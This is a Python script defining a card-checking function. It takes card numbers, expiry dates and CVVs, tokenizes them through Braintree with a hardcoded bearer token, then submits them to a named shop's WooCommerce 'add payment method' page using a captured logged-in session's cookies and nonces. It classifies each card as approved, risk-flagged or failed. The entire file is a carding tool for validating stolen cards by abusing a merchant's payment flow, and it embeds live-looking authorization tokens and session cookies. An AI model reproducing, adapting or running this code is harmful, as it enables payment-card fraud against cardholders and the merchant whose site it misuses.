def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	








	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI1MTk3ODgsImp0aSI6IjJhZmNmNTE0LTYyMzEtNDhiZC1hZWEzLWZmMjYwNDA1NjllNyIsInN1YiI6Imt0ZHQzdmI3ZnIzYms5d3oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imt0ZHQzdmI3ZnIzYms5d3oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.XwABSe1yh5ZkCCSkqzbfy_AXBX9hDJ9tUpSWLeDMvGG6FHrT0-BkkVOovdING-80jpB9f_IGNHZ0ryU9DhV1HA',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'dd52cab8-3cab-4adb-b11c-69bee0b6e5e6',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"dd52cab8-3cab-4adb-b11c-69bee0b6e5e6"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111970553736819","expirationMonth":"10","expirationYear":"2027","cvv":"034"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)


	tok = response.json()['data']['tokenizeCreditCard']['token']













	cookies = {
    '_ga': 'GA1.1.1641515761.1720417240',
    '_gcl_au': '1.1.1296404797.1720417240',
    '_fbp': 'fb.1.1720417240453.757916464664381020',
    'omnisend-form-65a6b96077ab435bd118c772-closed-at': '2024-07-08T05:40:53.208Z',
    'wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33': 'lyy446333%7C1722852237%7ChzItxZ7CArGipJ5BeouZMesfLO1LkJ96uIbgnTGO99M%7C93bbee58af75b8ed42cbd0a8e1095145634236d9bcd4fd587c34014dc5732234',
    'omnisendContactID': '668b7be25aac913d5ce0b612',
    '_fk_contact_uid': '3f472073565bab687d018eae2bd00c1a',
    'wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5': '44459%7Cother%7Cread%7C3be0062213a83dad6acb018c8f0a7c37924a81c2442d8e0e021cba01bb99b2b9',
    'fkcart_cart_qty': '1',
    'fkcart_cart_total': '%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E24.99%3C%2Fbdi%3E%3C%2Fspan%3E',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '7fdd91d593e03fb0fafce4a8737252f0',
    'wp_woocommerce_session_13e414371e5f1c2d9a0d5bf21c737d33': '44459%7C%7C1722606147%7C%7C1722602547%7C%7C59240cc8423a027b7e37ff794eae6b92',
    'soundestID': '20240731134232-V4WOixazeUMSXOW831vJCuOEJq9S9YYBlHnNolxE9UcCtQRMU',
    'omnisendSessionID': 'ieCpZCynMQvTdP-20240731134232',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-31%2013%3A42%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-07-31%2013%3A42%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'wffn_flt': '2024-7-31 07:42:33',
    'wffn_timezone': 'Africa/Cairo',
    'wffn_is_mobile': 'true',
    'wffn_browser': 'Chrome',
    'wffn_referrer': '',
    'wffn_fl_url': '/my-account/',
    'sbjs_session': 'pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F',
    'page-views': '3',
    '_ga_CYYECGMPHQ': 'GS1.1.1722433354.9.1.1722433411.3.0.0',
}

	headers = {
    'authority': 'efxsports.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1641515761.1720417240; _gcl_au=1.1.1296404797.1720417240; _fbp=fb.1.1720417240453.757916464664381020; omnisend-form-65a6b96077ab435bd118c772-closed-at=2024-07-08T05:40:53.208Z; wordpress_logged_in_13e414371e5f1c2d9a0d5bf21c737d33=lyy446333%7C1722852237%7ChzItxZ7CArGipJ5BeouZMesfLO1LkJ96uIbgnTGO99M%7C93bbee58af75b8ed42cbd0a8e1095145634236d9bcd4fd587c34014dc5732234; omnisendContactID=668b7be25aac913d5ce0b612; _fk_contact_uid=3f472073565bab687d018eae2bd00c1a; wfwaf-authcookie-e3884509b68293414f1439a8c4f61fd5=44459%7Cother%7Cread%7C3be0062213a83dad6acb018c8f0a7c37924a81c2442d8e0e021cba01bb99b2b9; fkcart_cart_qty=1; fkcart_cart_total=%3Cspan%20class%3D%22woocommerce-Price-amount%20amount%22%3E%3Cbdi%3E%3Cspan%20class%3D%22woocommerce-Price-currencySymbol%22%3E%26%2336%3B%3C%2Fspan%3E24.99%3C%2Fbdi%3E%3C%2Fspan%3E; woocommerce_items_in_cart=1; woocommerce_cart_hash=7fdd91d593e03fb0fafce4a8737252f0; wp_woocommerce_session_13e414371e5f1c2d9a0d5bf21c737d33=44459%7C%7C1722606147%7C%7C1722602547%7C%7C59240cc8423a027b7e37ff794eae6b92; soundestID=20240731134232-V4WOixazeUMSXOW831vJCuOEJq9S9YYBlHnNolxE9UcCtQRMU; omnisendSessionID=ieCpZCynMQvTdP-20240731134232; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-31%2013%3A42%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-31%2013%3A42%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wffn_flt=2024-7-31 07:42:33; wffn_timezone=Africa/Cairo; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=; wffn_fl_url=/my-account/; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fefxsports.com%2Fmy-account%2Fadd-payment-method%2F; page-views=3; _ga_CYYECGMPHQ=GS1.1.1722433354.9.1.1722433411.3.0.0',
    'origin': 'https://efxsports.com',
    'pragma': 'no-cache',
    'referer': 'https://efxsports.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'master-card'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '32.98'),
    ('wc_braintree_credit_card_payment_nonce', tok,),
    ('wc_braintree_device_data', '{"correlation_id":"d5885d0c935896a876e0f1007a46a5a8"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"d5885d0c935896a876e0f1007a46a5a8"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '32.98'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', 'ffc1a50fed'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post('https://efxsports.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
